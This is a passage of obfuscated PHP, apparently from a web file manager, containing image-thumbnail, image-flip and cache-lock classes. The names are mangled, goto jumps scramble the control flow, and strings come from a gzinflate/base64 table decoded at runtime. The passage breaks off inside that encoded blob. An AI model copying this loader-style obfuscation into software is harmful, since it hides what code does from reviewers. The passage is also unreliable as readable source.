++$Fï¯ÆŸÁ, $C‰©´¦‘£ += $CÂƒ‹Ë°Èî) { $AÙŒÛ ´° = fread($DÎâ“Ğ®Ë‡, $eñÖÔÂÁİö); if ($AÙŒÛ ´° === !1) { imagedestroy($B‡ß ‡‚ÒË); return !1; } $dêÍÔöšÇï = 0; for ($Cæ÷ŞèÍƒŠ = 0; $Cæ÷ŞèÍƒŠ < $eø¥“”ÉÛ; ++$Cæ÷ŞèÍƒŠ, $dêÍÔöšÇï += $C‹¯®„²—²) { list(, $eÔ–ãÙ¶¦Ì) = unpack($EÏğ¿ó™ß¸[1846], substr($AÙŒÛ ´°, $dêÍÔöšÇï, $C‹¯®„²—²) . $EÏğ¿ó™ß¸[1870]); $cé²Š¾õÆœ = $eÔ–ãÙ¶¦Ì & $fàÔî©®ØÆ; $dï·À´£´ƒ = $eÔ–ãÙ¶¦Ì & $aø–§Õæ³Á; $E®Ô¢Ú¨Öâ = $eÔ–ãÙ¶¦Ì & $e ø†æ°Û«; $FòŠ½¶˜à› = $eÔ–ãÙ¶¦Ì & $b÷Ôê™îØ; $aº«Š—·à† = $bäôì¶ÅæĞ - (($cé²Š¾õÆœ << 7) - $cé²Š¾õÆœ) * $Aº‹ÜáêÀ; $AÎ¥¸–Éîù = (($dï·À´£´ƒ << 8) - $dï·À´£´ƒ) * $a²ô´‰Ö’; $cÊ§’é¥©  = (($E®Ô¢Ú¨Öâ << 8) - $E®Ô¢Ú¨Öâ) * $eÎ ¾Ö«´´; $F«Ø§ÀõÎ = (($FòŠ½¶˜à› << 8) - $FòŠ½¶˜à›) * $CÀ‹øêÈò; imagesetpixel($B‡ß ‡‚ÒË, $Cæ÷ŞèÍƒŠ, $C‰©´¦‘£, $aº«Š—·à† << 24 | $AÎ¥¸–Éîù << 16 | $cÊ§’é¥©  << 8 | $F«Ø§ÀõÎ); } } imagealphablending($B‡ß ‡‚ÒË, !0); goto Cºé‚º‰«Ô; bó‹ËÚ´•: $a²ô´‰Ö’ = $aø–§Õæ³Á ? 1 / $aø–§Õæ³Á : 1; $eÎ ¾Ö«´´ = $e ø†æ°Û« ? 1 / $e ø†æ°Û« : 1; $CÀ‹øêÈò = $b÷Ôê™îØ ? 1 / $b÷Ôê™îØ : 1; goto açäÄä†“; dŒºÈˆöÂ¿: $B‡ß ‡‚ÒË = imagecreatetruecolor($eø¥“”ÉÛ, $F®Ò·‡‰°˜); imagealphablending($B‡ß ‡‚ÒË, !1); if ($fàÔî©®ØÆ) { imagesavealpha($B‡ß ‡‚ÒË, !0); } goto eµ‹”ë‘Ä; eµ‹”ë‘Ä: $C‹¯®„²—² = $EÇàù¶‘•Æ >> 3; $bäôì¶ÅæĞ = $fàÔî©®ØÆ ? 127 : 0; $Aº‹ÜáêÀ = $fàÔî©®ØÆ ? 1 / $fàÔî©®ØÆ : 1; goto bó‹ËÚ´•; Cºé‚º‰«Ô: } return $B‡ß ‡‚ÒË; goto dÛÈîÁµÛ; aÏó•ùæ ù: if ($eø¥“”ÉÛ == 0 || $B‡‚Œ¢Üñ¥ == 0 || $a¯‹‚ÒÖŒã != 1 || ($fàÔî©®ØÆ & $aø–§Õæ³Á) != 0 || ($fàÔî©®ØÆ & $e ø†æ°Û«) != 0 || ($fàÔî©®ØÆ & $b÷Ôê™îØ) != 0 || ($aø–§Õæ³Á & $e ø†æ°Û«) != 0 || ($aø–§Õæ³Á & $b÷Ôê™îØ) != 0 || ($e ø†æ°Û« & $b÷Ôê™îØ) != 0) { return !1; } if ($F†“ñá«ª == 4 || $F†“ñá«ª == 5) { $AÙŒÛ ´° = stream_get_contents($DÎâ“Ğ®Ë‡, $FòÏ†êÆİ—); if ($AÙŒÛ ´° === !1) { return !1; } return imagecreatefromstring($AÙŒÛ ´°); } $eñÖÔÂÁİö = $eø¥“”ÉÛ * $EÇàù¶‘•Æ + 31 >> 3 & ~3; goto A“ò†Çª; dÛÈîÁµÛ: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($FªŒ“‡ó¸©, $E›«ñÌé) { goto dàè„‹Óãí; fàÙò‰¬: if (!$this->im) { return !1; } $DßŠËØ›Ì = $_SERVER[çŞáÓæÚô‚Ô‡][43]; $this->imgData = GetImageSize($FªŒ“‡ó¸©, $DßŠËØ›Ì); goto AÙ©¥ğÑ¡ì; dàè„‹Óãí: $this->srcFile = $FªŒ“‡ó¸©; $this->echoType = $E›«ñÌé; $this->im = self::image($FªŒ“‡ó¸©); goto fàÙò‰¬; AÙ©¥ğÑ¡ì: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto eªÃ„âÉÎƒ; eªÃ„âÉÎƒ: } public static function image($e­¡¶“ï¶—) { $D­ÚğŞ¼Ìå =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dåñïõìÑŞ = $D­ÚğŞ¼Ìå[43]; $aœàâìÎ›« = GetImageSize($e­¡¶“ï¶—, $dåñïõìÑŞ); $D¶Œ¯ù‘í‘ = !1; switch ($aœàâìÎ›«[2]) { case IMAGETYPE_GIF: if (!function_exists($D­ÚğŞ¼Ìå[1871])) { break; } $D¶Œ¯ù‘í‘ = imagecreatefromgif($e­¡¶“ï¶—); break; case IMAGETYPE_JPEG: if (!function_exists($D­ÚğŞ¼Ìå[1872])) { break; } $D¶Œ¯ù‘í‘ = imagecreatefromjpeg($e­¡¶“ï¶—); break; case IMAGETYPE_PNG: if (!function_exists($D­ÚğŞ¼Ìå[1873])) { break; } $D¶Œ¯ù‘í‘ = @imagecreatefrompng($e­¡¶“ï¶—); imagesavealpha($D¶Œ¯ù‘í‘, !0); break; case IMAGETYPE_XBM: $D¶Œ¯ù‘í‘ = imagecreatefromxbm($e­¡¶“ï¶—); break; case IMAGETYPE_WBMP: $D¶Œ¯ù‘í‘ = imagecreatefromwbmp($e­¡¶“ï¶—); break; case IMAGETYPE_BMP: $D¶Œ¯ù‘í‘ = imagecreatefrombmp($e­¡¶“ï¶—); break; default: break; } return $D¶Œ¯ù‘í‘; } public static function imageSize($d‘¸æÒ ã) { $AäíÏÀë± =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a‰š²‚¤ê = GetImageSize($d‘¸æÒ ã); if (!$a‰š²‚¤ê) { return !1; } return array($AäíÏÀë±[1874] => $a‰š²‚¤ê[0], $AäíÏÀë±[1875] => $a‰š²‚¤ê[1]); } function distortion($a¸êÒ‰Õ¶, $aëï’µºÒÒ, $D§¾Ô¢ğ‹²) { $fƒñ„’âÇ„ = $this->creatImage($this->im, $aëï’µºÒÒ, $D§¾Ô¢ğ‹², 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($fƒñ„’âÇ„, $a¸êÒ‰Õ¶); } function prorate($bğø×¹Ÿ”, $A‡¯¤Á¶µ, $b¼î»‡ÉÑÍ) { $fŞœŠ–»¯ = $A‡¯¤Á¶µ / $b¼î»‡ÉÑÍ; $e­¤ëíô„ä = $this->srcW / $this->srcH; if ($fŞœŠ–»¯ <= $e­¤ëíô„ä) { $EƒÆ•„ÌÚå = $A‡¯¤Á¶µ; $fØë˜Ì„ÇÓ = $EƒÆ•„ÌÚå * ($this->srcH / $this->srcW); } else { $fØë˜Ì„ÇÓ = $b¼î»‡ÉÑÍ; $EƒÆ•„ÌÚå = $fØë˜Ì„ÇÓ * ($this->srcW / $this->srcH); } if ($this->srcW > $A‡¯¤Á¶µ || $this->srcH > $b¼î»‡ÉÑÍ) { $aÌ«¶ÙŸÔ = $this->creatImage($this->im, $EƒÆ•„ÌÚå, $fØë˜Ì„ÇÓ, 0, 0, 0, 0, $this->srcW, $this->srcH); } else { $aÌ«¶ÙŸÔ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); } $aÌ«¶ÙŸÔ = $this->autoRotate($aÌ«¶ÙŸÔ); return $this->echoImage($aÌ«¶ÙŸÔ, $bğø×¹Ÿ”); } private function autoRotate($CëÎñ·¬Æ…) { goto Aå÷ ±®Á; Aå÷ ±®Á: $DÀ¦»†óÈ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$CëÎñ·¬Æ… || !function_exists($DÀ¦»†óÈ[1876])) { return $CëÎñ·¬Æ…; } $A§œä“Š‡… = exif_read_data($this->srcFile); goto Cè¿¼‰æÒ‹; bÑô­ÀƒßË: if ($A§œä“Š‡…[$DÀ¦»†óÈ[1877]] == 8) { $A„ØÃÄ’º = 270; } if ($A§œä“Š‡…[$DÀ¦»†óÈ[1877]] == 3) { $A„ØÃÄ’º = 180; } return $this->rotateDegree($CëÎñ·¬Æ…, $A„ØÃÄ’º); goto d›ŒªËˆ®É; Cè¿¼‰æÒ‹: if (!$A§œä“Š‡… || !isset($A§œä“Š‡…[$DÀ¦»†óÈ[1877]]) || $A§œä“Š‡…[$DÀ¦»†óÈ[1877]] == 1) { return $CëÎñ·¬Æ…; } $A„ØÃÄ’º = 0; if ($A§œä“Š‡…[$DÀ¦»†óÈ[1877]] == 6) { $A„ØÃÄ’º = 90; } goto bÑô­ÀƒßË; d›ŒªËˆ®É: } private function rotateDegree($Aíğ˜®ƒ¥ƒ, $CœĞ·ÛÒ©Ä) { if (!$Aíğ˜®ƒ¥ƒ || $CœĞ·ÛÒ©Ä % 360 === 0 || !function_exists($_SERVER[çŞáÓæÚô‚Ô‡][1878])) { return $Aíğ˜®ƒ¥ƒ; } $eÕòÄªÇô× = imageRotate($Aíğ˜®ƒ¥ƒ, 360 - $CœĞ·ÛÒ©Ä, 0); imageDestroy($Aíğ˜®ƒ¥ƒ); return $eÕòÄªÇô× ? $eÕòÄªÇô× : $Aíğ˜®ƒ¥ƒ; } function cut($eƒ‘¨Ø‹Ü, $f¯‘¡îæëï, $BïñÓ¿Àø) { goto Dè·ç‰Óõ‡; Dè·ç‰Óõ‡: $fëõšÚÊ–³ = $f¯‘¡îæëï / $BïñÓ¿Àø; $Fáø«çóÒ = $this->srcW / $this->srcH; if ($fëõšÚÊ–³ <= $Fáø«çóÒ) { $ešíºî³ † = $BïñÓ¿Àø; $a×çÆÔ•¶ = $ešíºî³ † * ($this->srcW / $this->srcH); } else { $a×çÆÔ•¶ = $f¯‘¡îæëï; $ešíºî³ † = $a×çÆÔ•¶ * ($this->srcH / $this->srcW); } goto DØ¸‚˜Ô¯§; DØ¸‚˜Ô¯§: $a¹Î½Í“áˆ = $this->creatImage($this->im, $a×çÆÔ•¶, $ešíºî³ †, 0, 0, 0, 0, $this->srcW, $this->srcH); $BÆ‰…Ìñö¦ = $this->creatImage($a¹Î½Í“áˆ, $f¯‘¡îæëï, $BïñÓ¿Àø, 0, 0, ($a×çÆÔ•¶ - $f¯‘¡îæëï) / 2, ($ešíºî³ † - $BïñÓ¿Àø) / 2, $f¯‘¡îæëï, $BïñÓ¿Àø); imageDestroy($a¹Î½Í“áˆ); goto càÉ³éÔ¶±; càÉ³éÔ¶±: return $this->echoImage($BÆ‰…Ìñö¦, $eƒ‘¨Ø‹Ü); goto e£âš©ÕŞ±; e£âš©ÕŞ±: } function backFill($BõªÀÆ»¦, $bĞÒ­¤©, $EÎÜ’êâ‰á, $e êò–…ç = false, $Fƒä÷£õÆß = 255, $CÒäËÁçôÚ = 255, $Fª²—ÊÚö¶ = 255) { goto Cëß‘ù«; Aì¤ÅíÃ¾À: return $this->echoImage($F«Ô¾«¶¸Ä, $BõªÀÆ»¦); goto DßñÑÛç—¤; Bİíæóö†…: if ($e êò–…ç) { $E¯†«Åœ‰Ê = imageColorTransparent($F«Ô¾«¶¸Ä, $E¯†«Åœ‰Ê); $eæÊ¹Ù¨ØŞ = $EÎÜ’êâ‰á - $C¾›­¼‹²; } imageFilledRectangle($F«Ô¾«¶¸Ä, 0, 0, $bĞÒ­¤©, $EÎÜ’êâ‰á, $E¯†«Åœ‰Ê); if ($this->srcW > $bĞÒ­¤© || $this->srcH > $EÎÜ’êâ‰á) { $bÌµ è¬Î = $this->creatImage($this->im, $B—õ‰¡¢®à, $C¾›­¼‹², 0, 0, 0, 0, $this->srcW, $this->srcH); if ($B—õ‰¡¢®à < $bĞÒ­¤©) { imageCopy($F«Ô¾«¶¸Ä, $bÌµ è¬Î, ($bĞÒ­¤© - $B—õ‰¡¢®à) / 2, 0, 0, 0, $B—õ‰¡¢®à, $C¾›­¼‹²); } else { if ($C¾›­¼‹² < $EÎÜ’êâ‰á) { imageCopy($F«Ô¾«¶¸Ä, $bÌµ è¬Î, 0, $eæÊ¹Ù¨ØŞ, 0, 0, $B—õ‰¡¢®à, $C¾›­¼‹²); } else { imageCopy($F«Ô¾«¶¸Ä, $bÌµ è¬Î, 0, 0, 0, 0, $B—õ‰¡¢®à, $C¾›­¼‹²); } } } else { imageCopyMerge($F«Ô¾«¶¸Ä, $this->im, ($bĞÒ­¤© - $B—õ‰¡¢®à) / 2, $eæÊ¹Ù¨ØŞ, 0, 0, $B—õ‰¡¢®à, $C¾›­¼‹², 100); } goto Aì¤ÅíÃ¾À; Cëß‘ù«: $e–Ë¿°‡·‰ = $bĞÒ­¤© / $EÎÜ’êâ‰á; $CåÍŠÒÃ² = $this->srcW / $this->srcH; if ($e–Ë¿°‡·‰ <= $CåÍŠÒÃ²) { $B—õ‰¡¢®à = $bĞÒ­¤©; $C¾›­¼‹² = $B—õ‰¡¢®à * ($this->srcH / $this->srcW); } else { $C¾›­¼‹² = $EÎÜ’êâ‰á; $B—õ‰¡¢®à = $C¾›­¼‹² * ($this->srcW / $this->srcH); } goto FÉ¢ñù‰¥; FÉ¢ñù‰¥: if (function_exists($_SERVER[çŞáÓæÚô‚Ô‡][1879])) { @($F«Ô¾«¶¸Ä = imageCreateTrueColor($bĞÒ­¤©, $EÎÜ’êâ‰á)); if (!$F«Ô¾«¶¸Ä) { $F«Ô¾«¶¸Ä = imageCreate($bĞÒ­¤©, $EÎÜ’êâ‰á); } } else { $F«Ô¾«¶¸Ä = imageCreate($bĞÒ­¤©, $EÎÜ’êâ‰á); } $eæÊ¹Ù¨ØŞ = ($EÎÜ’êâ‰á - $C¾›­¼‹²) / 2; $E¯†«Åœ‰Ê = imagecolorallocate($F«Ô¾«¶¸Ä, $Fƒä÷£õÆß, $CÒäËÁçôÚ, $Fª²—ÊÚö¶); goto Bİíæóö†…; DßñÑÛç—¤: } function creatImage($bÆòİ›®§“, $e¨²«Ğ’ƒ, $d¨ÏÑ¨²í, $D–´œ¶Ûñ‹, $BÅ…ŞÇ†Ì , $cªÅºœÊ˜ª, $a’±¦¦÷øš, $cÊ™Â‘Œš£, $f’ìêåòŸ) { if (function_exists($_SERVER[çŞáÓæÚô‚Ô‡][1879])) { @($fß®ƒ³Í¨Ä = ImageCreateTrueColor($e¨²«Ğ’ƒ, $d¨ÏÑ¨²í)); @imagealphablending($fß®ƒ³Í¨Ä, !1); @imagesavealpha($fß®ƒ³Í¨Ä, !0); if ($fß®ƒ³Í¨Ä) { imageCopyResampled($fß®ƒ³Í¨Ä, $bÆòİ›®§“, $D–´œ¶Ûñ‹, $BÅ…ŞÇ†Ì , $cªÅºœÊ˜ª, $a’±¦¦÷øš, $e¨²«Ğ’ƒ, $d¨ÏÑ¨²í, $cÊ™Â‘Œš£, $f’ìêåòŸ); } else { $fß®ƒ³Í¨Ä = ImageCreate($e¨²«Ğ’ƒ, $d¨ÏÑ¨²í); imageCopyResized($fß®ƒ³Í¨Ä, $bÆòİ›®§“, $D–´œ¶Ûñ‹, $BÅ…ŞÇ†Ì , $cªÅºœÊ˜ª, $a’±¦¦÷øš, $e¨²«Ğ’ƒ, $d¨ÏÑ¨²í, $cÊ™Â‘Œš£, $f’ìêåòŸ); } } else { $fß®ƒ³Í¨Ä = ImageCreate($e¨²«Ğ’ƒ, $d¨ÏÑ¨²í); imageCopyResized($fß®ƒ³Í¨Ä, $bÆòİ›®§“, $D–´œ¶Ûñ‹, $BÅ…ŞÇ†Ì , $cªÅºœÊ˜ª, $a’±¦¦÷øš, $e¨²«Ğ’ƒ, $d¨ÏÑ¨²í, $cÊ™Â‘Œš£, $f’ìêåòŸ); } return $fß®ƒ³Í¨Ä; } public function imgRotate($cö¾Â›®´›, $f• Ë‹‰¨) { goto FºŠÌ›“Ş; A¿ ŒµÃŞ: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $CŠóùÍ¬† = imagegif($b„ƒ¿é‘†, $cö¾Â›®´›); break; case IMAGETYPE_JPEG: $CŠóùÍ¬† = imagejpeg($b„ƒ¿é‘†, $cö¾Â›®´›, 100); break; case IMAGETYPE_PNG: $CŠóùÍ¬† = imagePNG($b„ƒ¿é‘†, $cö¾Â›®´›); break; default: break; } imageDestroy($b„ƒ¿é‘†); imageDestroy($this->im); goto DèÛÅ—Å¤È; FºŠÌ›“Ş: if (!$this->im || $f• Ë‹‰¨ % 360 === 0 || !function_exists($_SERVER[çŞáÓæÚô‚Ô‡][1878])) { return !1; } $b„ƒ¿é‘† = imageRotate($this->im, 360 - $f• Ë‹‰¨, 0); $CŠóùÍ¬† = !1; goto A¿ ŒµÃŞ; DèÛÅ—Å¤È: return $CŠóùÍ¬†; goto e²×İÇ¤Á; e²×İÇ¤Á: } function echoImage($e„øšŒîåë, $BŸÔ¼£¨­Ø) { goto eİšƒÍÖ¹Æ; E¬½ŞÚä¬: $Fêªéö´Ê = !1; switch ($this->echoType) { case $A§êØİ‚Ë[1880]: $Fêªéö´Ê = imagePNG($e„øšŒîåë); break; case $A§êØİ‚Ë[177]: $Fêªéö´Ê = imagePNG($e„øšŒîåë, $BŸÔ¼£¨­Ø); break; } imageDestroy($e„øšŒîåë); goto Dñ‚Ä¥ƒÊ; eİšƒÍÖ¹Æ: $A§êØİ‚Ë =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$e„øšŒîåë) { return !1; } ob_get_clean(); goto E¬½ŞÚä¬; Dñ‚Ä¥ƒÊ: imageDestroy($this->im); return $Fêªéö´Ê; goto DÌãÀåØ‚–; DÌãÀåØ‚–: } } if (!function_exists($_SERVER[çŞáÓæÚô‚Ô‡][1881])) { define($_SERVER[çŞáÓæÚô‚Ô‡][1882], 0); define($_SERVER[çŞáÓæÚô‚Ô‡][1883], 1); define($_SERVER[çŞáÓæÚô‚Ô‡][1884], 2); function imageflip($b–Ùíé½Ù³, $AŸ¡’§ì) { switch ($AŸ¡’§ì) { case IMG_FLIP_HORIZONTAL: $Fõê™Ï„Ì‚ = imagesx($b–Ùíé½Ù³) - 1; $F÷«—Î”ƒÚ = $Fõê™Ï„Ì‚ / 2; $BØî‡øò÷Ù = imagesy($b–Ùíé½Ù³); $c¼È¨Ì‹‹Ä = imageistruecolor($b–Ùíé½Ù³) ? imagecreatetruecolor(1, $BØî‡øò÷Ù) : imagecreate(1, $BØî‡øò÷Ù); for ($CÎê·§ï£§ = 0; $CÎê·§ï£§ < $F÷«—Î”ƒÚ; ++$CÎê·§ï£§) { imagecopy($c¼È¨Ì‹‹Ä, $b–Ùíé½Ù³, 0, 0, $CÎê·§ï£§, 0, 1, $BØî‡øò÷Ù); imagecopy($b–Ùíé½Ù³, $b–Ùíé½Ù³, $CÎê·§ï£§, 0, $Fõê™Ï„Ì‚ - $CÎê·§ï£§, 0, 1, $BØî‡øò÷Ù); imagecopy($b–Ùíé½Ù³, $c¼È¨Ì‹‹Ä, $Fõê™Ï„Ì‚ - $CÎê·§ï£§, 0, 0, 0, 1, $BØî‡øò÷Ù); } break; case IMG_FLIP_VERTICAL: $C¾è—­¿¼â = imagesx($b–Ùíé½Ù³); $b¾ß§¸£¬ = imagesy($b–Ùíé½Ù³) - 1; $F˜ÛÉ´…¹ = $b¾ß§¸£¬ / 2; $c¼È¨Ì‹‹Ä = imageistruecolor($b–Ùíé½Ù³) ? imagecreatetruecolor($C¾è—­¿¼â, 1) : imagecreate($C¾è—­¿¼â, 1); for ($E†°Ø‚Ûõ³ = 0; $E†°Ø‚Ûõ³ < $F˜ÛÉ´…¹; ++$E†°Ø‚Ûõ³) { imagecopy($c¼È¨Ì‹‹Ä, $b–Ùíé½Ù³, 0, 0, 0, $E†°Ø‚Ûõ³, $C¾è—­¿¼â, 1); imagecopy($b–Ùíé½Ù³, $b–Ùíé½Ù³, 0, $E†°Ø‚Ûõ³, 0, $b¾ß§¸£¬ - $E†°Ø‚Ûõ³, $C¾è—­¿¼â, 1); imagecopy($b–Ùíé½Ù³, $c¼È¨Ì‹‹Ä, 0, $b¾ß§¸£¬ - $E†°Ø‚Ûõ³, 0, 0, $C¾è—­¿¼â, 1); } break; case IMG_FLIP_BOTH: $C¾è—­¿¼â = imagesx($b–Ùíé½Ù³); $BØî‡øò÷Ù = imagesy($b–Ùíé½Ù³); $c¼È¨Ì‹‹Ä = imagerotate($b–Ùíé½Ù³, 180, 0); imagecopy($b–Ùíé½Ù³, $c¼È¨Ì‹‹Ä, 0, 0, 0, 0, $C¾è—­¿¼â, $BØî‡øò÷Ù); break; default: return; } imagedestroy($c¼È¨Ì‹‹Ä); } } goto AÙ›¥™¤ö†; F¼×îÚõª: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $aŠÉñ¬åÆù =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D®êÖ»êÛ = $GLOBALS[$aŠÉñ¬åÆù[16]][$aŠÉñ¬åÆù[346]]; self::$cachePath = $D®êÖ»êÛ[$aŠÉñ¬åÆù[177]][$aŠÉñ¬åÆù[85]]; @mkdir(self::$cachePath, 511, !0); } public function lock($C¢óµÃÆš›, $DáÖÏæçÌÃ = 0) { goto Fšêñ‘; B‹§î¢Ö: $BğØ’âˆ = rtrim(self::$cachePath, $dÙ¶ŠÁ¹«¡[18]) . $dÙ¶ŠÁ¹«¡[782] . md5($C¢óµÃÆš›) . $dÙ¶ŠÁ¹«¡[783]; if (file_exists($BğØ’âˆ) && filemtime($BğØ’âˆ) && filemtime($BğØ’âˆ) < time() - 10) { @unlink($BğØ’âˆ); } do { if (file_exists($BğØ’âˆ)) { cacheLockWait(); continue; } $d°ïÌÉ„›› = fopen($BğØ’âˆ, $dÙ¶ŠÁ¹«¡[784]); if (!$d°ïÌÉ„››) { return !1; } $E•‚Ø–…‡ = flock($d°ïÌÉ„››, LOCK_EX | LOCK_NB); self::$caches[$C¢óµÃÆš›] = array($dÙ¶ŠÁ¹«¡[785] => $d°ïÌÉ„››, $dÙ¶ŠÁ¹«¡[177] => $BğØ’âˆ); fwrite($d°ïÌÉ„››, $aæ´ğïò»ó); clearstatcache(); if ($d°ïÌÉ„›› && $E•‚Ø–…‡) { return !0; } cacheLockWait(); } while (microtime(!0) < $aæ´ğïò»ó); goto Dæ½¹î…¸²; Fšêñ‘: $dÙ¶ŠÁ¹«¡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Dö˜ï‰«¬å = microtime(!0); $aæ´ğïò»ó = $Dö˜ï‰«¬å + $DáÖÏæçÌÃ + 0.0001; goto B‹§î¢Ö; Dæ½¹î…¸²: $this->unlock($C¢óµÃÆš›); return !1; goto AåëøªÛƒÃ; AåëøªÛƒÃ: } public function lockGet($CÀ¤ƒÛ²Ç) { $Cîå‹¯ÁÏÇ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cßš†ƒ²·œ = rtrim(self::$cachePath, $Cîå‹¯ÁÏÇ[18]) . $Cîå‹¯ÁÏÇ[782] . md5($CÀ¤ƒÛ²Ç) . $Cîå‹¯ÁÏÇ[783]; return file_exists($cßš†ƒ²·œ); } public function unlock($A““Ìâ„±Ì) { goto F†ÛßÖ™š; F†ÛßÖ™š: $c„•ê‹İÎ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $AŠŞË¿à‡ª = self::$caches[$A““Ìâ„±Ì]; if (!$AŠŞË¿à‡ª) { return; } goto dè£îÛæÓ¶; dè£îÛæÓ¶: @flock($AŠŞË¿à‡ª[$c„•ê‹İÎ[785]], LOCK_UN); @fclose($AŠŞË¿à‡ª[$c„•ê‹İÎ[785]]); @unlink($AŠŞË¿à‡ª[$c„•ê‹İÎ[177]]); goto f‘¬Œâí¤¬; f‘¬Œâí¤¬: unset(self::$caches[$A““Ìâ„±Ì]); goto dêÓ©ÀòÜÛ; dêÓ©ÀòÜÛ: } } class CacheLockRedis { public function lock($f•×¦¼Ú, $aáÚèçÜÊÇ = 10) { $D¾Äáì‰§ = Cache::init(); $d­À¦ƒ¤¡Â = microtime(!0) + $aáÚèçÜÊÇ; while (microtime(!0) < $d­À¦ƒ¤¡Â) { $A—™›õíí½ = $D¾Äáì‰§->get($f•×¦¼Ú); if (!$A—™›õíí½) { $bÏ³÷Áš®Ÿ = $D¾Äáì‰§->setLock($f•×¦¼Ú, $d­À¦ƒ¤¡Â, $aáÚèçÜÊÇ); if ($bÏ³÷Áš®Ÿ) { return !0; } } else { if ($A—™›õíí½ < microtime(!0)) { $D¾Äáì‰§->set($f•×¦¼Ú, $d­À¦ƒ¤¡Â, $d­À¦ƒ¤¡Â); if ($D¾Äáì‰§->get($f•×¦¼Ú) === $A—™›õíí½) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($c•Æ¬±êˆ) { return Cache::init()->get($c•Æ¬±êˆ); } public function unlock($Fà»Ì‚ˆ¯) { return Cache::init()->remove($Fà»Ì‚ˆ¯); } } class CacheLockMemcached { public function lock($E…Ä¢ˆØ¹¸, $fŸ¢Üï–×Û = 0) { $eŞ²øÖÒ¶Ì = Cache::init(); $cÓáÅ­¬¼ø = microtime(!0) + $fŸ¢Üï–×Û; while (microtime(!0) < $cÓáÅ­¬¼ø) { $Fë—ÊšØòÉ = $eŞ²øÖÒ¶Ì->get($E…Ä¢ˆØ¹¸); if (!$Fë—ÊšØòÉ || $Fë—ÊšØòÉ < microtime(!0)) { $Cî×º¸ÄÚŞ = $eŞ²øÖÒ¶Ì->handle->add($E…Ä¢ˆØ¹¸, $cÓáÅ­¬¼ø, $fŸ¢Üï–×Û); if ($Cî×º¸ÄÚŞ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($eõ±”†¬ÉÏ) { return Cache::init()->get($eõ±”†¬ÉÏ); } public function unlock($CÂœöö¢©ù) { return Cache::init()->remove($CÂœöö¢©ù); } } goto e¶»ÅØî½Ì; E¥„Õä”‹: if (!function_exists('_kodDe')) { function _kodDe($cùš²ç²áõ) { $cùš²ç²áõ = base64_decode($cùš²ç²áõ); $EéæŠ©„çà = strlen($cùš²ç²áõ); $eøÍ¹Û‘Îæ = ''; $E¦°†ÜÄ– = ord($cùš²ç²áõ[0]) - 30; for ($céÅ”Ñù›— = 1; $céÅ”Ñù›— < $EéæŠ©„çà; $céÅ”Ñù›— += 2) { if ($céÅ”Ñù›— + 1 < $EéæŠ©„çà) { $eøÍ¹Û‘Îæ .= chr(ord($cùš²ç²áõ[$céÅ”Ñù›— + 1]) + $E¦°†ÜÄ–); $eøÍ¹Û‘Îæ .= chr(ord($cùš²ç²áõ[$céÅ”Ñù›—]) + $E¦°†ÜÄ–); } else { $eøÍ¹Û‘Îæ .= chr(ord($cùš²ç²áõ[$céÅ”Ñù›—]) + $E¦°†ÜÄ–); } } return $eøÍ¹Û‘Îæ; } } define("\347\336\341\323\346\332\364\202\324\207", "\202\222\344\343\375\255"); $_SERVER[çŞáÓæÚô‚Ô‡] = explode("\174\3\174\1\174\6", gzinflate(substr(base64_decode('H4sIAAAAAAAAA519CWAbxdUwV4FwlQKlQDk2TkJsR4evXE7sRJZlW0S2FEmOEyxHWUkraW1JK++ufA==')."\45\151\71\303\21\222\162\137\341\54\5\2\45\241\34\345\16\107\51\320\322\2\55\264\334\127\77\110\302\15\241\55\205\226\302\77\367\314\256\144\240\77\255\243\231\67\157\146\347\170\363\346\315\314\173\157\356\376"."\x72\xcd\x9e\x6b\x76\x5f\xb3\xf7\xdf\x1f\xfa\xd7\xfb\x38\xb4\x66\x2f\xf4\x3f\x14\x3e\x6e\xfd\xbe\xbb\xa1\xff\xf6\xcc\x2f\xed\xe\xee\x51\x7f\xf0\xb6\xb1\x4f\xfb\x8a\x9f\xa6\xa4\x5d\x3d\x7\xec\xfb\xe4\x51\xca\x59\xf7\xf\x3f\xb2\x24".base64_decode('8vKKu641L7/rx2fteuL+utMHprz7t22XPL3zx5+tNsY+rvYc+sPsCb+e6hp/c+ijk/9y0jXBVaVtSw==')."\327\175\376\363\107\357\375\365\332\376\25\207\334\177\327\107\347\135\165\302\276\117\155\323\36\275\374\252\107\256\175\376\315\275\277\356\37\370\355\311\306\73\147\76\173\377\264\43\16\371\313\261\261\370\221\123\376\363"."\371\37\116\337\355\143\343\325\123\316\232\372\340\36\133\216\374\300\163\356\107\77\70\372\202\203\326\376\174\153\333\231\316\123\137\336\375\371\251\37\355\166\155\233\377\113\345\362\370\333\255\127\135\174\336\237\136\356"."\164\154\272\376\173\253\237\172\166\376\246\33\347\157\162\135\160\351\375\353\16\71\46\325\173\314\364\237\164\356\371\304\165\216\361\304\372\245\255\323\376\173\361\71\57\115\377\102\332\365\352\205\177\331\246\276\357\175"."\344\312\245\307\277\76\153\377\236\263\346\275\177\364\251\207\14\237\73\145\371\76\247\354\163\346\35\157\34\372\352\41\165\53\153\17\334\371\376\201\143\307\204\246\135\262\345\343\370\222\241\307\36\275\161\347\143\203"."\57\76\365\373\277\174\77\326\377\213\306\253\317\370\323\213\316\207\367\76\175\135\357\253\277\333\361\344\13\372\306\115\245\103\136\71\310\337\224\136\37\376\333\370\322\67\357\377\315\354\267\116\131\362\354\242\160\313"."\302\143\37\337\143\267\335\160\337\66\343\37\251\240\231\222\62\246\32\246\201\1\161\71\255\346\224\210\72\241\370\13\166\10\216\303\130\74\243\230\361\244\126\60\225\2\315\330\346\211\370\275\361\220\47\332\205\343"."\x72\xb1\xe8\x96\x4b\xa6\x96\xd3\xe4\